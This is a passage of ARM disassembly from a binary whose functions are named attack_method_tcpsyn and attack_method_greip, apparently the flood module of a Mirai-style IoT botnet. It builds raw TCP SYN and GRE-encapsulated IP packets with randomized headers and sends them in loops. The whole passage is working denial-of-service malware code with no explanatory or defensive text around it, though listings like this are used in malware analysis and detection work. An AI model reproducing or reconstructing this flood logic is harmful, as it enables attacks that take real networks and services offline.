    d548:	e5d1200d 	ldrb	r2, [r1, #13]
    d54c:	e59d301c 	ldr	r3, [sp, #28]
    d550:	e3c22002 	bic	r2, r2, #2
    d554:	e1822083 	orr	r2, r2, r3, lsl #1
    d558:	e5c1200d 	strb	r2, [r1, #13]
    d55c:	e5d1300d 	ldrb	r3, [r1, #13]
    d560:	e59d0020 	ldr	r0, [sp, #32]
    d564:	e3c33001 	bic	r3, r3, #1
    d568:	e1803003 	orr	r3, r0, r3
    d56c:	e5c1300d 	strb	r3, [r1, #13]
    d570:	e3a02004 	mov	r2, #4
    d574:	e3a01002 	mov	r1, #2
    d578:	e5c41028 	strb	r1, [r4, #40]	; 0x28
    d57c:	e5c42029 	strb	r2, [r4, #41]	; 0x29
    d580:	eb0013a6 	bl	12420 <rand_next>
    d584:	e200000f 	and	r0, r0, #15
    d588:	e2800e57 	add	r0, r0, #1392	; 0x570
    d58c:	e2800008 	add	r0, r0, #8
    d590:	e1a00800 	lsl	r0, r0, #16
    d594:	e1a03420 	lsr	r3, r0, #8
    d598:	e2033cff 	and	r3, r3, #65280	; 0xff00
    d59c:	e1833c20 	orr	r3, r3, r0, lsr #24
    d5a0:	e1c432ba 	strh	r3, [r4, #42]	; 0x2a
    d5a4:	e3a03004 	mov	r3, #4
    d5a8:	e5c4302c 	strb	r3, [r4, #44]	; 0x2c
    d5ac:	e3a0200a 	mov	r2, #10
    d5b0:	e3a03008 	mov	r3, #8
    d5b4:	e3a00002 	mov	r0, #2
    d5b8:	e5c4302e 	strb	r3, [r4, #46]	; 0x2e
    d5bc:	e5c4202f 	strb	r2, [r4, #47]	; 0x2f
    d5c0:	e5c4002d 	strb	r0, [r4, #45]	; 0x2d
    d5c4:	eb001395 	bl	12420 <rand_next>
    d5c8:	e3a02006 	mov	r2, #6
    d5cc:	e5c4203b 	strb	r2, [r4, #59]	; 0x3b
    d5d0:	e3a01003 	mov	r1, #3
    d5d4:	e3a03000 	mov	r3, #0
    d5d8:	e3a02001 	mov	r2, #1
    d5dc:	e5840030 	str	r0, [r4, #48]	; 0x30
    d5e0:	e5843034 	str	r3, [r4, #52]	; 0x34
    d5e4:	e5c42038 	strb	r2, [r4, #56]	; 0x38
    d5e8:	e5c4103a 	strb	r1, [r4, #58]	; 0x3a
    d5ec:	e5c41039 	strb	r1, [r4, #57]	; 0x39
    d5f0:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    d5f4:	e0834002 	add	r4, r3, r2
    d5f8:	e1540007 	cmp	r4, r7
    d5fc:	e58d406c 	str	r4, [sp, #108]	; 0x6c
    d600:	baffff90 	blt	d448 <attack_method_tcpsyn+0x2cc>
    d604:	e3a03000 	mov	r3, #0
    d608:	e3570000 	cmp	r7, #0
    d60c:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    d610:	0afffffb 	beq	d604 <attack_method_tcpsyn+0x488>
    d614:	e1a00003 	mov	r0, r3
    d618:	e1a03280 	lsl	r3, r0, #5
    d61c:	e0433180 	sub	r3, r3, r0, lsl #3
    d620:	e0833008 	add	r3, r3, r8
    d624:	e5d32014 	ldrb	r2, [r3, #20]
    d628:	e7995100 	ldr	r5, [r9, r0, lsl #2]
    d62c:	e352001f 	cmp	r2, #31
    d630:	e2856014 	add	r6, r5, #20
    d634:	9a00003b 	bls	d728 <attack_method_tcpsyn+0x5ac>
    d638:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    d63c:	e3730001 	cmn	r3, #1
    d640:	0a000050 	beq	d788 <attack_method_tcpsyn+0x60c>
    d644:	e3a04801 	mov	r4, #65536	; 0x10000
    d648:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    d64c:	e2444001 	sub	r4, r4, #1
    d650:	e1500004 	cmp	r0, r4
    d654:	0a000052 	beq	d7a4 <attack_method_tcpsyn+0x628>
    d658:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    d65c:	e1510004 	cmp	r1, r4
    d660:	0a000054 	beq	d7b8 <attack_method_tcpsyn+0x63c>
    d664:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    d668:	e1520004 	cmp	r2, r4
    d66c:	0a000056 	beq	d7cc <attack_method_tcpsyn+0x650>
    d670:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    d674:	e1530004 	cmp	r3, r4
    d678:	0a000058 	beq	d7e0 <attack_method_tcpsyn+0x664>
    d67c:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    d680:	e1500004 	cmp	r0, r4
    d684:	0a00005a 	beq	d7f4 <attack_method_tcpsyn+0x678>
    d688:	e35b0000 	cmp	fp, #0
    d68c:	1a00005c 	bne	d804 <attack_method_tcpsyn+0x688>
    d690:	e3a01000 	mov	r1, #0
    d694:	e1c510ba 	strh	r1, [r5, #10]
    d698:	e1a00005 	mov	r0, r5
    d69c:	e3a01014 	mov	r1, #20
    d6a0:	eb000445 	bl	e7bc <checksum_generic>
    d6a4:	e3a02000 	mov	r2, #0
    d6a8:	e1c500ba 	strh	r0, [r5, #10]
    d6ac:	e1a01006 	mov	r1, r6
    d6b0:	e1c621b0 	strh	r2, [r6, #16]
    d6b4:	e3a03028 	mov	r3, #40	; 0x28
    d6b8:	e3a02b0a 	mov	r2, #10240	; 0x2800
    d6bc:	e1a00005 	mov	r0, r5
    d6c0:	eb000451 	bl	e80c <checksum_tcpudp>
    d6c4:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    d6c8:	e1a0e283 	lsl	lr, r3, #5
    d6cc:	e1c601b0 	strh	r0, [r6, #16]
    d6d0:	e04ee183 	sub	lr, lr, r3, lsl #3
    d6d4:	e1d660b2 	ldrh	r6, [r6, #2]
    d6d8:	e08ee008 	add	lr, lr, r8
    d6dc:	e1ce60b2 	strh	r6, [lr, #2]
    d6e0:	e3a03901 	mov	r3, #16384	; 0x4000
    d6e4:	e3a0c010 	mov	ip, #16
    d6e8:	e1a01005 	mov	r1, r5
    d6ec:	e1a0000a 	mov	r0, sl
    d6f0:	e3a0203c 	mov	r2, #60	; 0x3c
    d6f4:	e58de000 	str	lr, [sp]
    d6f8:	e58dc004 	str	ip, [sp, #4]
    d6fc:	eb002d54 	bl	18c54 <__libc_sendto>
    d700:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    d704:	e2830001 	add	r0, r3, #1
    d708:	e1500007 	cmp	r0, r7
    d70c:	e58d006c 	str	r0, [sp, #108]	; 0x6c
    d710:	baffffc0 	blt	d618 <attack_method_tcpsyn+0x49c>
    d714:	e3a03000 	mov	r3, #0
    d718:	e3570000 	cmp	r7, #0
    d71c:	e58d306c 	str	r3, [sp, #108]	; 0x6c
    d720:	0affffb7 	beq	d604 <attack_method_tcpsyn+0x488>
    d724:	eaffffba 	b	d614 <attack_method_tcpsyn+0x498>
    d728:	e5934010 	ldr	r4, [r3, #16]
    d72c:	eb00133b 	bl	12420 <rand_next>
    d730:	e59d306c 	ldr	r3, [sp, #108]	; 0x6c
    d734:	e1a01283 	lsl	r1, r3, #5
    d738:	e0411183 	sub	r1, r1, r3, lsl #3
    d73c:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    d740:	e1a02c24 	lsr	r2, r4, #24
    d744:	e182242c 	orr	r2, r2, ip, lsr #8
    d748:	e0811008 	add	r1, r1, r8
    d74c:	e2043cff 	and	r3, r4, #65280	; 0xff00
    d750:	e5d1c014 	ldrb	ip, [r1, #20]
    d754:	e1822403 	orr	r2, r2, r3, lsl #8
    d758:	e1822c04 	orr	r2, r2, r4, lsl #24
    d75c:	e0822c30 	add	r2, r2, r0, lsr ip
    d760:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    d764:	e1a03c22 	lsr	r3, r2, #24
    d768:	e1833420 	orr	r3, r3, r0, lsr #8
    d76c:	e2021cff 	and	r1, r2, #65280	; 0xff00
    d770:	e1833401 	orr	r3, r3, r1, lsl #8
    d774:	e1833c02 	orr	r3, r3, r2, lsl #24
    d778:	e5853010 	str	r3, [r5, #16]
    d77c:	e59d3060 	ldr	r3, [sp, #96]	; 0x60
    d780:	e3730001 	cmn	r3, #1
    d784:	1affffae 	bne	d644 <attack_method_tcpsyn+0x4c8>
    d788:	eb001324 	bl	12420 <rand_next>
    d78c:	e3a04801 	mov	r4, #65536	; 0x10000
    d790:	e585000c 	str	r0, [r5, #12]
    d794:	e59d004c 	ldr	r0, [sp, #76]	; 0x4c
    d798:	e2444001 	sub	r4, r4, #1
    d79c:	e1500004 	cmp	r0, r4
    d7a0:	1affffac 	bne	d658 <attack_method_tcpsyn+0x4dc>
    d7a4:	eb00131d 	bl	12420 <rand_next>
    d7a8:	e59d1058 	ldr	r1, [sp, #88]	; 0x58
    d7ac:	e1510004 	cmp	r1, r4
    d7b0:	e1c500b4 	strh	r0, [r5, #4]
    d7b4:	1affffaa 	bne	d664 <attack_method_tcpsyn+0x4e8>
    d7b8:	eb001318 	bl	12420 <rand_next>
    d7bc:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    d7c0:	e1520004 	cmp	r2, r4
    d7c4:	e1c501b4 	strh	r0, [r5, #20]
    d7c8:	1affffa8 	bne	d670 <attack_method_tcpsyn+0x4f4>
    d7cc:	eb001313 	bl	12420 <rand_next>
    d7d0:	e59d3028 	ldr	r3, [sp, #40]	; 0x28
    d7d4:	e1530004 	cmp	r3, r4
    d7d8:	e1c600b2 	strh	r0, [r6, #2]
    d7dc:	1affffa6 	bne	d67c <attack_method_tcpsyn+0x500>
    d7e0:	eb00130e 	bl	12420 <rand_next>
    d7e4:	e5860004 	str	r0, [r6, #4]
    d7e8:	e59d002c 	ldr	r0, [sp, #44]	; 0x2c
    d7ec:	e1500004 	cmp	r0, r4
    d7f0:	1affffa4 	bne	d688 <attack_method_tcpsyn+0x50c>
    d7f4:	eb001309 	bl	12420 <rand_next>
    d7f8:	e35b0000 	cmp	fp, #0
    d7fc:	e5860008 	str	r0, [r6, #8]
    d800:	0affffa2 	beq	d690 <attack_method_tcpsyn+0x514>
    d804:	eb001305 	bl	12420 <rand_next>
    d808:	e1c601b2 	strh	r0, [r6, #18]
    d80c:	eaffff9f 	b	d690 <attack_method_tcpsyn+0x514>
    d810:	e1a0000a 	mov	r0, sl
    d814:	eb003735 	bl	1b4f0 <__GI___libc_close>
    d818:	e28dd074 	add	sp, sp, #116	; 0x74
    d81c:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d820:	e12fff1e 	bx	lr
    d824:	0002c58c 	andeq	ip, r2, ip, lsl #11

0000d828 <attack_method_greip>:
    d828:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    d82c:	e1a09001 	mov	r9, r1
    d830:	e24dd064 	sub	sp, sp, #100	; 0x64
    d834:	e3a01004 	mov	r1, #4
    d838:	e1a04002 	mov	r4, r2
    d83c:	e1a05003 	mov	r5, r3
    d840:	e1a0a000 	mov	sl, r0
    d844:	eb003018 	bl	198ac <calloc>
    d848:	e1a01005 	mov	r1, r5
    d84c:	e58d001c 	str	r0, [sp, #28]
    d850:	e3a02002 	mov	r2, #2
    d854:	e3a03000 	mov	r3, #0
    d858:	e1a00004 	mov	r0, r4
    d85c:	ebfff32f 	bl	a520 <attack_get_opt_int>
    d860:	e3a03801 	mov	r3, #65536	; 0x10000
    d864:	e1a0c000 	mov	ip, r0
    d868:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d86c:	e2433001 	sub	r3, r3, #1
    d870:	e3a02003 	mov	r2, #3
    d874:	e1a01005 	mov	r1, r5
    d878:	e1a00004 	mov	r0, r4
    d87c:	e58dc028 	str	ip, [sp, #40]	; 0x28
    d880:	ebfff326 	bl	a520 <attack_get_opt_int>
    d884:	e1a01005 	mov	r1, r5
    d888:	e3a02004 	mov	r2, #4
    d88c:	e3a03040 	mov	r3, #64	; 0x40
    d890:	e1a0b000 	mov	fp, r0
    d894:	e1a00004 	mov	r0, r4
    d898:	ebfff320 	bl	a520 <attack_get_opt_int>
    d89c:	e1a0c000 	mov	ip, r0
    d8a0:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d8a4:	e1a01005 	mov	r1, r5
    d8a8:	e3a02005 	mov	r2, #5
    d8ac:	e3a03001 	mov	r3, #1
    d8b0:	e1a00004 	mov	r0, r4
    d8b4:	e58dc02c 	str	ip, [sp, #44]	; 0x2c
    d8b8:	ebfff318 	bl	a520 <attack_get_opt_int>
    d8bc:	e3a03801 	mov	r3, #65536	; 0x10000
    d8c0:	e1a0c000 	mov	ip, r0
    d8c4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d8c8:	e2433001 	sub	r3, r3, #1
    d8cc:	e3a02006 	mov	r2, #6
    d8d0:	e1a01005 	mov	r1, r5
    d8d4:	e1a00004 	mov	r0, r4
    d8d8:	e58dc030 	str	ip, [sp, #48]	; 0x30
    d8dc:	ebfff30f 	bl	a520 <attack_get_opt_int>
    d8e0:	e3a03801 	mov	r3, #65536	; 0x10000
    d8e4:	e1a01005 	mov	r1, r5
    d8e8:	e2433001 	sub	r3, r3, #1
    d8ec:	e3a02007 	mov	r2, #7
    d8f0:	e1a08000 	mov	r8, r0
    d8f4:	e1a00004 	mov	r0, r4
    d8f8:	ebfff308 	bl	a520 <attack_get_opt_int>
    d8fc:	e1a01005 	mov	r1, r5
    d900:	e3a02000 	mov	r2, #0
    d904:	e3a03c02 	mov	r3, #512	; 0x200
    d908:	e1a07000 	mov	r7, r0
    d90c:	e1a00004 	mov	r0, r4
    d910:	ebfff302 	bl	a520 <attack_get_opt_int>
    d914:	e3a02001 	mov	r2, #1
    d918:	e1a03002 	mov	r3, r2
    d91c:	e58d003c 	str	r0, [sp, #60]	; 0x3c
    d920:	e1a01005 	mov	r1, r5
    d924:	e1a00004 	mov	r0, r4
    d928:	ebfff2fc 	bl	a520 <attack_get_opt_int>
    d92c:	e1a0c000 	mov	ip, r0
    d930:	e20cc0ff 	and	ip, ip, #255	; 0xff
    d934:	e1a01005 	mov	r1, r5
    d938:	e3a02013 	mov	r2, #19
    d93c:	e3a03000 	mov	r3, #0
    d940:	e1a00004 	mov	r0, r4
    d944:	e58dc040 	str	ip, [sp, #64]	; 0x40
    d948:	ebfff2f4 	bl	a520 <attack_get_opt_int>
    d94c:	e59f24ec 	ldr	r2, [pc, #1260]	; de40 <attack_method_greip+0x618>
    d950:	e1a01005 	mov	r1, r5
    d954:	e5923000 	ldr	r3, [r2]
    d958:	e1a06000 	mov	r6, r0
    d95c:	e3a02019 	mov	r2, #25
    d960:	e1a00004 	mov	r0, r4
    d964:	ebfff2ed 	bl	a520 <attack_get_opt_int>
    d968:	e3a01003 	mov	r1, #3
    d96c:	e58d0020 	str	r0, [sp, #32]
    d970:	e3a02006 	mov	r2, #6
    d974:	e3a00002 	mov	r0, #2
    d978:	eb002ce9 	bl	18d24 <__GI_socket>
    d97c:	e3700001 	cmn	r0, #1
    d980:	e58d0024 	str	r0, [sp, #36]	; 0x24
    d984:	0a000124 	beq	de1c <attack_method_greip+0x5f4>
    d988:	e28d3060 	add	r3, sp, #96	; 0x60
    d98c:	e3a02001 	mov	r2, #1
    d990:	e5232004 	str	r2, [r3, #-4]!
    d994:	e3a0c004 	mov	ip, #4
    d998:	e3a01000 	mov	r1, #0
    d99c:	e2822002 	add	r2, r2, #2
    d9a0:	e58dc000 	str	ip, [sp]
    d9a4:	eb002ccc 	bl	18cdc <__GI_setsockopt>
    d9a8:	e3700001 	cmn	r0, #1
    d9ac:	0a000118 	beq	de14 <attack_method_greip+0x5ec>
    d9b0:	e1a08808 	lsl	r8, r8, #16
    d9b4:	e1a07807 	lsl	r7, r7, #16
    d9b8:	e1a0b80b 	lsl	fp, fp, #16
    d9bc:	e20660ff 	and	r6, r6, #255	; 0xff
    d9c0:	e3a01000 	mov	r1, #0
    d9c4:	e1a03828 	lsr	r3, r8, #16
    d9c8:	e1a04827 	lsr	r4, r7, #16
    d9cc:	e35a0000 	cmp	sl, #0
    d9d0:	e58db018 	str	fp, [sp, #24]
    d9d4:	e58d8014 	str	r8, [sp, #20]
    d9d8:	e58d7010 	str	r7, [sp, #16]
    d9dc:	e58d6044 	str	r6, [sp, #68]	; 0x44
    d9e0:	e58d105c 	str	r1, [sp, #92]	; 0x5c
    d9e4:	e1a0b82b 	lsr	fp, fp, #16
    d9e8:	e58d3034 	str	r3, [sp, #52]	; 0x34
    d9ec:	e58d4038 	str	r4, [sp, #56]	; 0x38
    d9f0:	0a00010c 	beq	de28 <attack_method_greip+0x600>
    d9f4:	e59d503c 	ldr	r5, [sp, #60]	; 0x3c
    d9f8:	e1e0200b 	mvn	r2, fp
    d9fc:	e1a03805 	lsl	r3, r5, #16
    da00:	e283870d 	add	r8, r3, #3407872	; 0x340000
    da04:	e1a02802 	lsl	r2, r2, #16
    da08:	e1a01408 	lsl	r1, r8, #8
    da0c:	e1a0c402 	lsl	ip, r2, #8
    da10:	e59d4034 	ldr	r4, [sp, #52]	; 0x34
    da14:	e1a01821 	lsr	r1, r1, #16
    da18:	e1a0c82c 	lsr	ip, ip, #16
    da1c:	e2837702 	add	r7, r3, #524288	; 0x80000
    da20:	e59d5038 	ldr	r5, [sp, #56]	; 0x38
    da24:	e2833707 	add	r3, r3, #1835008	; 0x1c0000
    da28:	e18c2c22 	orr	r2, ip, r2, lsr #24
    da2c:	e1a00c0b 	lsl	r0, fp, #24
    da30:	e1818c28 	orr	r8, r1, r8, lsr #24
    da34:	e59d1018 	ldr	r1, [sp, #24]
    da38:	e1a0ec04 	lsl	lr, r4, #24
    da3c:	e1a06423 	lsr	r6, r3, #8
    da40:	e1a00820 	lsr	r0, r0, #16
    da44:	e58d2050 	str	r2, [sp, #80]	; 0x50
    da48:	e59d2014 	ldr	r2, [sp, #20]
    da4c:	e1a04c05 	lsl	r4, r5, #24
    da50:	e1800c21 	orr	r0, r0, r1, lsr #24
    da54:	e1a0e82e 	lsr	lr, lr, #16
    da58:	e2066cff 	and	r6, r6, #65280	; 0xff00
    da5c:	e59d1010 	ldr	r1, [sp, #16]
    da60:	e1a05407 	lsl	r5, r7, #8
    da64:	e1a04824 	lsr	r4, r4, #16
    da68:	e18eec22 	orr	lr, lr, r2, lsr #24
    da6c:	e1863c23 	orr	r3, r6, r3, lsr #24
    da70:	e1844c21 	orr	r4, r4, r1, lsr #24
    da74:	e1a05825 	lsr	r5, r5, #16
    da78:	e58d0054 	str	r0, [sp, #84]	; 0x54
    da7c:	e58de04c 	str	lr, [sp, #76]	; 0x4c
    da80:	e58d3008 	str	r3, [sp, #8]
    da84:	e58d4048 	str	r4, [sp, #72]	; 0x48
    da88:	e1857c27 	orr	r7, r5, r7, lsr #24
    da8c:	e3a04000 	mov	r4, #0
    da90:	e3a00e5e 	mov	r0, #1504	; 0x5e0
    da94:	e3a01004 	mov	r1, #4
    da98:	e2800006 	add	r0, r0, #6
    da9c:	eb002f82 	bl	198ac <calloc>
    daa0:	e59d201c 	ldr	r2, [sp, #28]
    daa4:	e59d305c 	ldr	r3, [sp, #92]	; 0x5c
    daa8:	e7820104 	str	r0, [r2, r4, lsl #2]
    daac:	e7924103 	ldr	r4, [r2, r3, lsl #2]
    dab0:	e5d42000 	ldrb	r2, [r4]
    dab4:	e3c220b0 	bic	r2, r2, #176	; 0xb0
    dab8:	e3822040 	orr	r2, r2, #64	; 0x40
    dabc:	e5c42000 	strb	r2, [r4]
    dac0:	e1a01283 	lsl	r1, r3, #5
    dac4:	e0411183 	sub	r1, r1, r3, lsl #3
    dac8:	e5d43000 	ldrb	r3, [r4]
    dacc:	e3c3300a 	bic	r3, r3, #10
    dad0:	e3833005 	orr	r3, r3, #5
    dad4:	e59d5030 	ldr	r5, [sp, #48]	; 0x30
    dad8:	e5c43000 	strb	r3, [r4]
    dadc:	e59d2028 	ldr	r2, [sp, #40]	; 0x28
    dae0:	e5c42001 	strb	r2, [r4, #1]
    dae4:	e59d302c 	ldr	r3, [sp, #44]	; 0x2c
    dae8:	e3550000 	cmp	r5, #0
    daec:	e5c43008 	strb	r3, [r4, #8]
    daf0:	13a03040 	movne	r3, #64	; 0x40
    daf4:	e59d5054 	ldr	r5, [sp, #84]	; 0x54
    daf8:	11c430b6 	strhne	r3, [r4, #6]
    dafc:	e3a0302f 	mov	r3, #47	; 0x2f
    db00:	e5c43009 	strb	r3, [r4, #9]
    db04:	e2842014 	add	r2, r4, #20
    db08:	e3a03008 	mov	r3, #8
    db0c:	e1c450b4 	strh	r5, [r4, #4]
    db10:	e1c480b2 	strh	r8, [r4, #2]
    db14:	e1c230b2 	strh	r3, [r2, #2]
    db18:	e59d3020 	ldr	r3, [sp, #32]
    db1c:	e5d42018 	ldrb	r2, [r4, #24]
    db20:	e584300c 	str	r3, [r4, #12]
    db24:	e3c220b0 	bic	r2, r2, #176	; 0xb0
    db28:	e3822040 	orr	r2, r2, #64	; 0x40
    db2c:	e0811009 	add	r1, r1, r9
    db30:	e5911010 	ldr	r1, [r1, #16]
    db34:	e5c42018 	strb	r2, [r4, #24]
    db38:	e5d43018 	ldrb	r3, [r4, #24]
    db3c:	e3c3300a 	bic	r3, r3, #10
    db40:	e3833005 	orr	r3, r3, #5
    db44:	e5c43018 	strb	r3, [r4, #24]
    db48:	e5841010 	str	r1, [r4, #16]
    db4c:	e59d1028 	ldr	r1, [sp, #40]	; 0x28
    db50:	e2845018 	add	r5, r4, #24
    db54:	e5c51001 	strb	r1, [r5, #1]
    db58:	e59d2008 	ldr	r2, [sp, #8]
    db5c:	e59d3050 	ldr	r3, [sp, #80]	; 0x50
    db60:	e59d102c 	ldr	r1, [sp, #44]	; 0x2c
    db64:	e1c520b2 	strh	r2, [r5, #2]
    db68:	e1c530b4 	strh	r3, [r5, #4]
    db6c:	13a02040 	movne	r2, #64	; 0x40
    db70:	e3a03011 	mov	r3, #17
    db74:	e5c51008 	strb	r1, [r5, #8]
    db78:	11c520b6 	strhne	r2, [r5, #6]
    db7c:	e5c53009 	strb	r3, [r5, #9]
    db80:	eb001226 	bl	12420 <rand_next>
    db84:	e59d1044 	ldr	r1, [sp, #68]	; 0x44
    db88:	e2403b01 	sub	r3, r0, #1024	; 0x400
    db8c:	e3510000 	cmp	r1, #0
    db90:	e1e03003 	mvn	r3, r3
    db94:	15943010 	ldrne	r3, [r4, #16]
    db98:	05853010 	streq	r3, [r5, #16]
    db9c:	15853010 	strne	r3, [r5, #16]
    dba0:	e585000c 	str	r0, [r5, #12]
    dba4:	e59d305c 	ldr	r3, [sp, #92]	; 0x5c
    dba8:	e284602c 	add	r6, r4, #44	; 0x2c
    dbac:	e59d204c 	ldr	r2, [sp, #76]	; 0x4c
    dbb0:	e2834001 	add	r4, r3, #1
    dbb4:	e59d3048 	ldr	r3, [sp, #72]	; 0x48
    dbb8:	e154000a 	cmp	r4, sl
    dbbc:	e1c670b4 	strh	r7, [r6, #4]
    dbc0:	e1c620b0 	strh	r2, [r6]
    dbc4:	e1c630b2 	strh	r3, [r6, #2]
    dbc8:	e58d405c 	str	r4, [sp, #92]	; 0x5c
    dbcc:	baffffaf 	blt	da90 <attack_method_greip+0x268>
    dbd0:	e59d403c 	ldr	r4, [sp, #60]	; 0x3c
    dbd4:	e59d503c 	ldr	r5, [sp, #60]	; 0x3c
    dbd8:	e2844008 	add	r4, r4, #8
    dbdc:	e58d400c 	str	r4, [sp, #12]
    dbe0:	e2858034 	add	r8, r5, #52	; 0x34
    dbe4:	e3a03000 	mov	r3, #0
    dbe8:	e35a0000 	cmp	sl, #0
    dbec:	e58d305c 	str	r3, [sp, #92]	; 0x5c
    dbf0:	0afffffb 	beq	dbe4 <attack_method_greip+0x3bc>
    dbf4:	e1a00003 	mov	r0, r3
    dbf8:	e1a03280 	lsl	r3, r0, #5
    dbfc:	e0433180 	sub	r3, r3, r0, lsl #3
    dc00:	e0833009 	add	r3, r3, r9
    dc04:	e59d401c 	ldr	r4, [sp, #28]
    dc08:	e5d32014 	ldrb	r2, [r3, #20]
    dc0c:	e7945100 	ldr	r5, [r4, r0, lsl #2]
    dc10:	e352001f 	cmp	r2, #31
    dc14:	e2856018 	add	r6, r5, #24
    dc18:	e285702c 	add	r7, r5, #44	; 0x2c
    dc1c:	9a00003f 	bls	dd20 <attack_method_greip+0x4f8>
    dc20:	e59d1020 	ldr	r1, [sp, #32]
    dc24:	e3710001 	cmn	r1, #1
    dc28:	0a000054 	beq	dd80 <attack_method_greip+0x558>
    dc2c:	e3a04801 	mov	r4, #65536	; 0x10000
    dc30:	e2444001 	sub	r4, r4, #1
    dc34:	e15b0004 	cmp	fp, r4
    dc38:	0a000056 	beq	dd98 <attack_method_greip+0x570>
    dc3c:	e59d2034 	ldr	r2, [sp, #52]	; 0x34
    dc40:	e1520004 	cmp	r2, r4
    dc44:	0a00005d 	beq	ddc0 <attack_method_greip+0x598>
    dc48:	e59d3038 	ldr	r3, [sp, #56]	; 0x38
    dc4c:	e1530004 	cmp	r3, r4
    dc50:	0a00005f 	beq	ddd4 <attack_method_greip+0x5ac>
    dc54:	e59d4044 	ldr	r4, [sp, #68]	; 0x44
    dc58:	e3540000 	cmp	r4, #0
    dc5c:	15953010 	ldrne	r3, [r5, #16]
    dc60:	15863010 	strne	r3, [r6, #16]
    dc64:	0a000061 	beq	ddf0 <attack_method_greip+0x5c8>
    dc68:	e59d1040 	ldr	r1, [sp, #64]	; 0x40
    dc6c:	e3510000 	cmp	r1, #0
    dc70:	1a000063 	bne	de04 <attack_method_greip+0x5dc>
    dc74:	e3a02000 	mov	r2, #0
    dc78:	e1c520ba 	strh	r2, [r5, #10]
    dc7c:	e3a01014 	mov	r1, #20
    dc80:	e1a00005 	mov	r0, r5
    dc84:	eb0002cc 	bl	e7bc <checksum_generic>
    dc88:	e3a03000 	mov	r3, #0
    dc8c:	e1c500ba 	strh	r0, [r5, #10]
    dc90:	e3a01014 	mov	r1, #20
    dc94:	e1c630ba 	strh	r3, [r6, #10]
    dc98:	e1a00006 	mov	r0, r6
    dc9c:	eb0002c6 	bl	e7bc <checksum_generic>
    dca0:	e1c600ba 	strh	r0, [r6, #10]
    dca4:	e3a04000 	mov	r4, #0
    dca8:	e1a01007 	mov	r1, r7
    dcac:	e1d720b4 	ldrh	r2, [r7, #4]
    dcb0:	e59d300c 	ldr	r3, [sp, #12]
    dcb4:	e1c740b6 	strh	r4, [r7, #6]
    dcb8:	e1a00006 	mov	r0, r6
    dcbc:	eb0002d2 	bl	e80c <checksum_tcpudp>
    dcc0:	e59d205c 	ldr	r2, [sp, #92]	; 0x5c
    dcc4:	e1a03282 	lsl	r3, r2, #5
    dcc8:	e5951010 	ldr	r1, [r5, #16]
    dccc:	e0433182 	sub	r3, r3, r2, lsl #3
    dcd0:	e083e009 	add	lr, r3, r9
    dcd4:	e58e1004 	str	r1, [lr, #4]
    dcd8:	e3a01002 	mov	r1, #2
    dcdc:	e1c700b6 	strh	r0, [r7, #6]
    dce0:	e3a0c010 	mov	ip, #16
    dce4:	e18310b9 	strh	r1, [r3, r9]
    dce8:	e1ce40b2 	strh	r4, [lr, #2]
    dcec:	e3a03901 	mov	r3, #16384	; 0x4000
    dcf0:	e1a01005 	mov	r1, r5
    dcf4:	e59d0024 	ldr	r0, [sp, #36]	; 0x24
    dcf8:	e1a02008 	mov	r2, r8
    dcfc:	e58de000 	str	lr, [sp]
    dd00:	e58dc004 	str	ip, [sp, #4]
    dd04:	eb002bd2 	bl	18c54 <__libc_sendto>
    dd08:	e59d305c 	ldr	r3, [sp, #92]	; 0x5c
    dd0c:	e2830001 	add	r0, r3, #1
    dd10:	e150000a 	cmp	r0, sl
    dd14:	e58d005c 	str	r0, [sp, #92]	; 0x5c
    dd18:	aaffffb1 	bge	dbe4 <attack_method_greip+0x3bc>
    dd1c:	eaffffb5 	b	dbf8 <attack_method_greip+0x3d0>
    dd20:	e5934010 	ldr	r4, [r3, #16]
    dd24:	eb0011bd 	bl	12420 <rand_next>
    dd28:	e59d305c 	ldr	r3, [sp, #92]	; 0x5c
    dd2c:	e1a01283 	lsl	r1, r3, #5
    dd30:	e0411183 	sub	r1, r1, r3, lsl #3
    dd34:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    dd38:	e1a02c24 	lsr	r2, r4, #24
    dd3c:	e182242c 	orr	r2, r2, ip, lsr #8
    dd40:	e0811009 	add	r1, r1, r9
    dd44:	e2043cff 	and	r3, r4, #65280	; 0xff00
    dd48:	e5d1c014 	ldrb	ip, [r1, #20]
    dd4c:	e1822403 	orr	r2, r2, r3, lsl #8
    dd50:	e1822c04 	orr	r2, r2, r4, lsl #24
    dd54:	e0822c30 	add	r2, r2, r0, lsr ip
    dd58:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    dd5c:	e1a03c22 	lsr	r3, r2, #24
    dd60:	e2021cff 	and	r1, r2, #65280	; 0xff00
    dd64:	e1833420 	orr	r3, r3, r0, lsr #8
    dd68:	e1833401 	orr	r3, r3, r1, lsl #8
    dd6c:	e59d1020 	ldr	r1, [sp, #32]
    dd70:	e1833c02 	orr	r3, r3, r2, lsl #24
    dd74:	e3710001 	cmn	r1, #1
    dd78:	e5853010 	str	r3, [r5, #16]
    dd7c:	1affffaa 	bne	dc2c <attack_method_greip+0x404>
    dd80:	eb0011a6 	bl	12420 <rand_next>
    dd84:	e3a04801 	mov	r4, #65536	; 0x10000
    dd88:	e2444001 	sub	r4, r4, #1
    dd8c:	e15b0004 	cmp	fp, r4
    dd90:	e585000c 	str	r0, [r5, #12]
    dd94:	1affffa8 	bne	dc3c <attack_method_greip+0x414>
    dd98:	eb0011a0 	bl	12420 <rand_next>
    dd9c:	e1a00800 	lsl	r0, r0, #16
    dda0:	e1a00820 	lsr	r0, r0, #16
    dda4:	e59d2034 	ldr	r2, [sp, #52]	; 0x34
